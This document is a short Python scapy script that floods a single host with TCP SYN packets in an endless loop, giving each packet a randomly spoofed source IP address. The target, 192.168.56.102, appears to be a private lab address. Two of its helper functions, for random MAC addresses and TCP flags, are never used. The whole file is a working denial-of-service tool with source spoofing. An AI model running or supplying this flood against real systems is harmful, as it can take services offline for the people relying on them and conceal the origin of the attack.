import random
import time

from scapy.all import *


def generate_mac_address() -> str:
    mac_address = ""

    for i in range(6):
        number = random.randint(0, 255)
        hex_string = hex(number).removeprefix("0x")

        if i != 5:
            mac_address += f"{hex_string}:"

        else:
            mac_address += f"{hex_string}"

    return mac_address


def generate_ip_address() -> str:
    ip_address = ""

    for i in range(4):
        number = random.randint(0, 255)

        if i != 3:
            ip_address += f"{number}."

        else:
            ip_address += f"{number}"

    return ip_address


def generate_tcp_flag() -> str:
    flags = ("S", "A", "F", "R", "P", "U", "E", "C")
    
    return random.choice(flags)


ethernet = Ether()
ip = IP()
tcp = TCP()

ethernet.src = "00:11:22:33:44:55"

ip.dst = "192.168.56.102"

while True:
    ip.src = generate_ip_address()

    tcp.flags = "S"

    p = ethernet / ip / tcp

    sendp(p)
